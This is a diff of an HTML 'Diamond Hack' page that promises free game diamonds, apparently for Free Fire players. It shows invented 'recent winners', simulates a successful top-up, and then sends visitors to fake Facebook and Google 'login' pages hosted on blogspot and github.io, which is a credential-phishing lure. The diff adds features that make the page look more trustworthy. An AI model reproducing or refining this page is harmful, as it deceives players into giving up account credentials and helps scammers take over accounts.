@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Diamond Hack</title>
   <style>
     body {
@@ -14,7 +14,7 @@
     }
     .container {
       max-width: 400px;
-      margin: auto;
+      margin: 50px auto;
       padding: 20px;
       text-align: center;
     }
@@ -46,28 +46,46 @@
       background: #00ffcc;
       color: #000;
       border: none;
-      padding: 10px 20px;
+      padding: 12px 20px;
       font-weight: bold;
       border-radius: 10px;
       cursor: pointer;
       margin-top: 10px;
+      font-size: 16px;
+      width: 100%;
+      transition: all 0.3s;
+    }
+    .submit-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0, 255, 204, 0.4);
     }
     .diamond-list {
       display: flex;
       flex-direction: column;
       gap: 10px;
-      margin-top: 10px;
+      margin-top: 20px;
     }
     .package {
       background-color: #111;
-      padding: 12px;
+      padding: 15px;
       border-radius: 10px;
       cursor: pointer;
-      transition: 0.3s;
+      transition: all 0.3s;
+      font-size: 16px;
+      position: relative;
+      overflow: hidden;
+      border: 1px solid #333;
     }
     .package:hover {
       background-color: #222;
-      box-shadow: 0 0 8px #00ffcc88;
+      box-shadow: 0 0 15px #00ffcc88;
+      transform: translateY(-3px);
+    }
+    .package.selected {
+      background-color: #00ffcc22;
+      box-shadow: 0 0 15px #00ffcc;
+      color: #00ffcc;
+      border: 1px solid #00ffcc;
     }
     .logs {
       margin-top: 30px;
@@ -81,14 +99,17 @@
       box-shadow: 0 0 5px #00ffcc44;
     }
     .log-entry {
-      margin-bottom: 6px;
+      margin-bottom: 8px;
+      padding: 5px;
+      border-bottom: 1px solid #333;
     }
     .log-entry span {
       color: #00ffcc;
+      font-weight: bold;
     }
     .loader {
       display: none;
-      margin: 15px auto;
+      margin: 20px auto;
       border: 5px solid #f3f3f3;
       border-top: 5px solid #00ffcc;
       border-radius: 50%;
@@ -99,10 +120,6 @@
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
-    }
-    .diamond-icon {
-      width: 16px;
-      vertical-align: middle;
     }
     .diamond-emoji {
       font-size: 48px;
@@ -141,10 +158,12 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      transition: transform 0.3s;
+      transition: all 0.3s;
+      font-size: 16px;
     }
     .login-btn:hover {
       transform: translateY(-3px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
     }
     .facebook-btn {
       background: linear-gradient(135deg, #3b5998, #2d4373);
@@ -161,8 +180,119 @@
     .success-message {
       color: #00ffcc;
       font-size: 1.1rem;
-      margin-bottom: 20px;
+      margin: 20px 0;
       display: none;
+      animation: fadeIn 1s;
+    }
+    .uid-input-container {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    .uid-input-container::after {
+      content: "💎";
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 20px;
+    }
+    .server-selector {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 10px;
+      margin-bottom: 15px;
+      font-size: 16px;
+      text-align: center;
+      outline: none;
+      background-color: #111;
+      color: #00ffcc;
+      box-shadow: 0 0 10px #00ffcc88;
+    }
+    .user-card {
+      background: #111;
+      border-radius: 10px;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #333;
+      position: relative;
+      overflow: hidden;
+      animation: cardEntry 0.5s ease-out;
+      display: flex;
+      align-items: center;
+    }
+    @keyframes cardEntry {
+      from { transform: translateX(-20px); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+    .user-avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #00ffcc, #0099ff);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 10px;
+      font-size: 18px;
+    }
+    .user-info {
+      text-align: left;
+      flex-grow: 1;
+    }
+    .user-name {
+      font-weight: bold;
+      margin-bottom: 3px;
+    }
+    .user-details {
+      font-size: 12px;
+      color: #aaa;
+    }
+    .user-country {
+      display: inline-block;
+      padding: 2px 5px;
+      border-radius: 3px;
+      font-size: 10px;
+      margin-right: 5px;
+    }
+    .country-bd {
+      background: #006a4e;
+      color: #f0f0f0;
+    }
+    .country-in {
+      background: #ff9933;
+      color: #000;
+    }
+    .country-br {
+      background: #009b3a;
+      color: #f0f0f0;
+    }
+    .diamond-count {
+      color: #00ffcc;
+      font-weight: bold;
+      font-size: 14px;
+    }
+    .time-ago {
+      color: #777;
+      font-size: 11px;
+    }
+    .package::before {
+      content: "";
+      position: absolute;
+      top: -10px;
+      left: -10px;
+      right: -10px;
+      bottom: -10px;
+      background: linear-gradient(45deg, #00ffcc, transparent);
+      opacity: 0;
+      transition: opacity 0.3s;
+      z-index: 0;
+    }
+    .package:hover::before {
+      opacity: 0.1;
+    }
+    .package.selected::before {
+      opacity: 0.2;
     }
   </style>
 </head>
@@ -171,11 +301,20 @@
     <h1>💎 Diamond Hack</h1>
     <div class="selected-package" id="selectedPackage"></div>
 
-    <input type="number" id="uid" placeholder="Enter your UID" />
+    <div class="uid-input-container">
+      <input type="number" id="uid" placeholder="Enter your Player ID" />
+    </div>
+
+    <select class="server-selector" id="serverSelector">
+      <option value="">Select Server</option>
+      <option value="bangladesh">Bangladesh Server</option>
+      <option value="india">India Server</option>
+      <option value="brazil">Brazil Server</option>
+    </select>
 
     <div class="diamond-list" id="diamondList"></div>
 
-    <button class="submit-btn" onclick="handleSubmit()">Submit</button>
+    <button class="submit-btn" id="submitBtn">GET DIAMONDS</button>
     
     <div class="diamond-emoji" id="diamondEmoji">💎</div>
     
@@ -187,87 +326,229 @@
     
     <div class="login-options" id="loginOptions">
       <div class="login-title">Choose Login Method:</div>
-      <button class="login-btn facebook-btn" onclick="loginWithFacebook()">
-        <img src="https://img.icons8.com/fluency/48/facebook-new.png" class="btn-icon">
+      <button class="login-btn facebook-btn" id="facebookBtn">
+        <img src="https://img.icons8.com/fluency/48/facebook-new.png" class="btn-icon" alt="Facebook">
         Continue with Facebook
       </button>
-      <button class="login-btn google-btn" onclick="loginWithGoogle()">
-        <img src="https://img.icons8.com/color/48/google-logo.png" class="btn-icon">
+      <button class="login-btn google-btn" id="googleBtn">
+        <img src="https://img.icons8.com/color/48/google-logo.png" class="btn-icon" alt="Google">
         Continue with Google
       </button>
     </div>
 
-    <div class="logs" id="logs"></div>
+    <div class="logs" id="logs">
+      <div class="log-entry"><span>System</span>: Waiting for user action...</div>
+    </div>
   </div>
   
   <script>
-    const diamondPackages = [
-      "25 Dimond", "50 Dimond", "115 Dimond",
-      "240 Dimond", "610 Dimond", "1090 Dimond",
-      "1240 Dimond", "1595 Dimond", "2090 Dimond", "2530 Dimond"
-    ];
+    document.addEventListener('DOMContentLoaded', function() {
+      // DOM Elements
+      const diamondPackages = [
+        "25 Diamonds", "50 Diamonds", "115 Diamonds",
+        "240 Diamonds", "610 Diamonds", "1090 Diamonds",
+        "1240 Diamonds", "1595 Diamonds", "2090 Diamonds", "2530 Diamonds"
+      ];
 
-    const fakeUsers = ["Raju", "Kiran", "Laxmi", "Bibek", "Sandhya", "Rita", "Kushal", "Sunita"];
-    const selected = document.getElementById("selectedPackage");
-    const list = document.getElementById("diamondList");
-    const logs = document.getElementById("logs");
-    const loader = document.getElementById("loader");
-    const diamondEmoji = document.getElementById("diamondEmoji");
-    const loginOptions = document.getElementById("loginOptions");
-    const successMessage = document.getElementById("successMessage");
-
-    let selectedText = "";
-
-    diamondPackages.forEach(item => {
-      const div = document.createElement("div");
-      div.className = "package";
-      div.innerHTML = `💎 ${item}`;
-      div.onclick = () => {
-        selectedText = item;
-        selected.style.display = "block";
-        selected.innerHTML = `Selected: 💎 ${item}`;
+      const fakeUsers = [
+        {name: "Raju", country: "bd"},
+        {name: "Kiran", country: "in"},
+        {name: "Laxmi", country: "in"},
+        {name: "Bibek", country: "bd"},
+        {name: "Sandhya", country: "in"},
+        {name: "Rita", country: "bd"},
+        {name: "Kushal", country: "in"},
+        {name: "Sunita", country: "in"},
+        {name: "Carlos", country: "br"},
+        {name: "Fernanda", country: "br"},
+        {name: "Rajiv", country: "in"},
+        {name: "Ayesha", country: "bd"}
+      ];
+      
+      const countryNames = {
+        "bd": "Bangladesh",
+        "in": "India",
+        "br": "Brazil"
       };
-      list.appendChild(div);
-    });
+      
+      const countryClasses = {
+        "bd": "country-bd",
+        "in": "country-in",
+        "br": "country-br"
+      };
 
-    function handleSubmit() {
-      const uid = document.getElementById("uid").value.trim();
-      if (!uid || !selectedText) {
-        alert("Please enter UID and select a package.");
-        return;
+      const selectedElement = document.getElementById("selectedPackage");
+      const listElement = document.getElementById("diamondList");
+      const logsElement = document.getElementById("logs");
+      const loaderElement = document.getElementById("loader");
+      const diamondEmojiElement = document.getElementById("diamondEmoji");
+      const loginOptionsElement = document.getElementById("loginOptions");
+      const successMessageElement = document.getElementById("successMessage");
+      const submitBtn = document.getElementById("submitBtn");
+      const facebookBtn = document.getElementById("facebookBtn");
+      const googleBtn = document.getElementById("googleBtn");
+      const uidInput = document.getElementById("uid");
+      const serverSelector = document.getElementById("serverSelector");
+
+      let selectedPackage = "";
+
+      // Initialize diamond packages
+      function initializePackages() {
+        diamondPackages.forEach(item => {
+          const packageElement = document.createElement("div");
+          packageElement.className = "package";
+          packageElement.innerHTML = `💎 ${item}`;
+          packageElement.addEventListener('click', () => {
+            // Remove selected class from all packages
+            document.querySelectorAll('.package').forEach(pkg => {
+              pkg.classList.remove('selected');
+            });
+            
+            // Add selected class to clicked package
+            packageElement.classList.add('selected');
+            
+            selectedPackage = item;
+            selectedElement.style.display = "block";
+            selectedElement.innerHTML = `Selected: 💎 ${item}`;
+            
+            // Add to logs
+            addLogEntry(`Selected package: ${item}`);
+          });
+          listElement.appendChild(packageElement);
+        });
       }
-      loader.style.display = "block";
-      setTimeout(() => {
-        loader.style.display = "none";
-        diamondEmoji.style.display = "block";
-        successMessage.style.display = "block";
-        loginOptions.style.display = "block";
-      }, 3000);
-    }
 
-    function loginWithGoogle() {
-      window.location.href = "https://kiranxettry.github.io/Kiranxettry/";
-    }
-
-    function loginWithFacebook() {
-      window.location.href = "https://kiranxettry.github.io/Facebook-LOGIN-/";
-    }
-
-    function addFakeUserLog() {
-      const count = Math.floor(Math.random() * 2) + 5; // 5-6 users
-      for (let i = 0; i < count; i++) {
-        const name = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
-        const units = Math.floor(Math.random() * 1000) + 50;
-        const minutesAgo = Math.floor(Math.random() * 5) + 1;
+      // Add log entry
+      function addLogEntry(message) {
         const entry = document.createElement("div");
         entry.className = "log-entry";
-        entry.innerHTML = `<span>${name}</span> got <span>${units}</span> diamonds <span>${minutesAgo} min ago</span>`;
-        logs.prepend(entry);
-        if (logs.childElementCount > 50) logs.removeChild(logs.lastChild);
+        entry.innerHTML = message.replace(/(Selected package:|got|min ago|Server|Processing|Success|Error|Redirecting|System)/g, '<span>$1</span>');
+        logsElement.prepend(entry);
+        
+        // Limit logs to 50 entries
+        if (logsElement.children.length > 50) {
+          logsElement.removeChild(logsElement.lastChild);
+        }
+        
+        // Auto-scroll to top
+        logsElement.scrollTop = 0;
       }
-    }
 
-    setInterval(addFakeUserLog, 1000);
+      // Create user card
+      function createUserCard(user, diamonds, minutesAgo) {
+        const card = document.createElement("div");
+        card.className = "user-card";
+        
+        const country = user.country;
+        const countryName = countryNames[country];
+        const countryClass = countryClasses[country];
+        
+        card.innerHTML = `
+          <div class="user-avatar">${user.name.charAt(0)}</div>
+          <div class="user-info">
+            <div class="user-name">${user.name}</div>
+            <div class="user-details">
+              <span class="user-country ${countryClass}">${countryName}</span>
+              <span class="diamond-count">${diamonds} 💎</span>
+              <span class="time-ago">${minutesAgo} min ago</span>
+            </div>
+          </div>
+        `;
+        
+        return card;
+      }
+
+      // Generate fake user logs
+      function generateFakeLogs() {
+        const count = Math.floor(Math.random() * 2) + 1; // 1-2 users
+        for (let i = 0; i < count; i++) {
+          const user = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
+          const diamonds = Math.floor(Math.random() * 1000) + 50;
+          const minutesAgo = Math.floor(Math.random() * 4) + 1;
+          
+          const userCard = createUserCard(user, diamonds, minutesAgo);
+          logsElement.prepend(userCard);
+          
+          // Limit logs to 50 entries
+          if (logsElement.children.length > 50) {
+            logsElement.removeChild(logsElement.lastChild);
+          }
+        }
+      }
+
+      // Handle form submission
+      function handleSubmit() {
+        const uid = uidInput.value.trim();
+        const server = serverSelector.value;
+        
+        if (!uid) {
+          addLogEntry("<span>Error</span>: Please enter your Player ID");
+          uidInput.focus();
+          return;
+        }
+        
+        if (!server) {
+          addLogEntry("<span>Error</span>: Please select a server");
+          return;
+        }
+        
+        if (!selectedPackage) {
+          addLogEntry("<span>Error</span>: Please select a diamond package");
+          return;
+        }
+        
+        addLogEntry(`<span>Server</span>: ${serverSelector.options[serverSelector.selectedIndex].text}`);
+        addLogEntry(`<span>Processing</span>: Requesting ${selectedPackage} for ID: ${uid}...`);
+        
+        // Show loader
+        loaderElement.style.display = "block";
+        submitBtn.disabled = true;
+        
+        // Simulate processing delay
+        setTimeout(() => {
+          loaderElement.style.display = "none";
+          diamondEmojiElement.style.display = "block";
+          
+          addLogEntry(`<span>Success</span>: ${selectedPackage} added to account ${uid}`);
+          
+          // Show success message and login options
+          setTimeout(() => {
+            successMessageElement.style.display = "block";
+            loginOptionsElement.style.display = "block";
+            addLogEntry("<span>System</span>: Please login to verify your account");
+          }, 500);
+        }, 3000);
+      }
+
+      // Login handlers
+      function loginWithFacebook() {
+        addLogEntry("<span>Redirecting</span>: To Facebook login...");
+        window.location.href = "https://freediamondnp.blogspot.com/?m=1";
+      }
+
+      function loginWithGoogle() {
+        addLogEntry("<span>Redirecting</span>: To Google login...");
+        window.location.href = "https://dimondhacks.blogspot.com/?m=1";
+      }
+
+      // Event listeners
+      submitBtn.addEventListener('click', handleSubmit);
+      facebookBtn.addEventListener('click', loginWithFacebook);
+      googleBtn.addEventListener('click', loginWithGoogle);
+
+      // Initialize
+      initializePackages();
+      
+      // Start generating fake logs periodically
+      setInterval(generateFakeLogs, 5000);
+      
+      // Add initial fake logs
+      setTimeout(() => {
+        for (let i = 0; i < 5; i++) {
+          generateFakeLogs();
+        }
+      }, 1000);
+    });
   </script>
 </body>
 </html>
